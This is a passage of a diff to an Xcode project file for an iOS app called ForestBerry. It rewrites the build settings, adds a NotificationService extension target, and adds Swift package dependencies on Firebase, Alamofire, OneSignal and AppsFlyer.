+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CODE_SIGN_ENTITLEMENTS = ForestBerry.entitlements;
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 4;
+				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
-				INFOPLIST_FILE = ForestBerry/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = ForestBerry;
+				ENABLE_PREVIEWS = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs access to save photos to your photo library.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This app uses your data to deliver personalized ads and measure advertising performance.";
+				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0.0;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MARKETING_VERSION = 1.1;
 				PRODUCT_BUNDLE_IDENTIFIER = com.forest.berry.app;
+				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				SDKROOT = iphoneos;
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		7E11DD9D2F19433300D9D662 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CODE_SIGN_ENTITLEMENTS = ForestBerry.entitlements;
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = "";
+				ENABLE_PREVIEWS = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs access to save photos to your photo library.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This app uses your data to deliver personalized ads and measure advertising performance.";
+				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MARKETING_VERSION = 1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.forest.berry.app;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		7EBAEF2B2F1932EB008E1F06 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CODE_SIGN_ENTITLEMENTS = NotificationService/NotificationService.entitlements;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = "";
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = NotificationService/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = NotificationService;
+				INFOPLIST_KEY_NSHumanReadableCopyright = "";
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MARKETING_VERSION = 1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.forest.berry.app.NotificationService;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				SKIP_INSTALL = YES;
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		7EBAEF2C2F1932EB008E1F06 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CODE_SIGN_ENTITLEMENTS = NotificationService/NotificationService.entitlements;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = "";
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = NotificationService/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = NotificationService;
+				INFOPLIST_KEY_NSHumanReadableCopyright = "";
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MARKETING_VERSION = 1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.forest.berry.app.NotificationService;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				SKIP_INSTALL = YES;
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
 		};
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
-		510C73A5EBE3AA4730A1CD83 /* Build configuration list for PBXNativeTarget "ForestBerry" */ = {
-			isa = XCConfigurationList;
-			buildConfigurations = (
-				479F5F894FFF392E850452BC /* Debug */,
-				70B06B85D7E8539E17006478 /* Release */,
-			);
-			defaultConfigurationIsVisible = 0;
-			defaultConfigurationName = Debug;
-		};
 		787D2AB86F84610DB2D5CB07 /* Build configuration list for PBXProject "ForestBerry" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
@@ -480,7 +580,118 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Debug;
 		};
+		7E11DD9B2F19433300D9D662 /* Build configuration list for PBXNativeTarget "ForestBerry" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				7E11DD9C2F19433300D9D662 /* Debug */,
+				7E11DD9D2F19433300D9D662 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Debug;
+		};
+		7EBAEF2E2F1932EB008E1F06 /* Build configuration list for PBXNativeTarget "NotificationService" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				7EBAEF2B2F1932EB008E1F06 /* Debug */,
+				7EBAEF2C2F1932EB008E1F06 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Debug;
+		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		7E11DDDD2F19442B00D9D662 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 12.8.0;
+			};
+		};
+		7E11DDEA2F19445B00D9D662 /* XCRemoteSwiftPackageReference "Alamofire" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/Alamofire/Alamofire";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.11.0;
+			};
+		};
+		7E11DDED2F19447E00D9D662 /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/OneSignal/OneSignal-iOS-SDK";
+			requirement = {
+				kind = exactVersion;
+				version = 5.2.15;
+			};
+		};
+		7E11DDF42F19449000D9D662 /* XCRemoteSwiftPackageReference "AppsFlyerFramework-Static" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/AppsFlyerSDK/AppsFlyerFramework-Static.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 6.17.8;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		7E11DDDE2F19442B00D9D662 /* FirebaseAnalytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDDD2F19442B00D9D662 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalytics;
+		};
+		7E11DDE02F19442B00D9D662 /* FirebaseAnalyticsIdentitySupport */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDDD2F19442B00D9D662 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalyticsIdentitySupport;
+		};
+		7E11DDE22F19442B00D9D662 /* FirebaseCore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDDD2F19442B00D9D662 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseCore;
+		};
+		7E11DDE42F19442B00D9D662 /* FirebaseInAppMessaging-Beta */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDDD2F19442B00D9D662 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = "FirebaseInAppMessaging-Beta";
+		};
+		7E11DDE62F19442B00D9D662 /* FirebaseMessaging */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDDD2F19442B00D9D662 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseMessaging;
+		};
+		7E11DDE82F19442B00D9D662 /* FirebaseRemoteConfig */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDDD2F19442B00D9D662 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseRemoteConfig;
+		};
+		7E11DDEB2F19445B00D9D662 /* Alamofire */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDEA2F19445B00D9D662 /* XCRemoteSwiftPackageReference "Alamofire" */;
+			productName = Alamofire;
+		};
+		7E11DDEE2F19447E00D9D662 /* OneSignalExtension */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDED2F19447E00D9D662 /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
+			productName = OneSignalExtension;
+		};
+		7E11DDF02F19447E00D9D662 /* OneSignalFramework */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDED2F19447E00D9D662 /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
+			productName = OneSignalFramework;
+		};
+		7E11DDF22F19447E00D9D662 /* OneSignalInAppMessages */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDED2F19447E00D9D662 /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
+			productName = OneSignalInAppMessages;
+		};
+		7E11DDF52F19449000D9D662 /* AppsFlyerLib-Static */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 7E11DDF42F19449000D9D662 /* XCRemoteSwiftPackageReference "AppsFlyerFramework-Static" */;
+			productName = "AppsFlyerLib-Static";
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = 5FD492FE08A234A5A6BF5FA0 /* Project object */;
 }
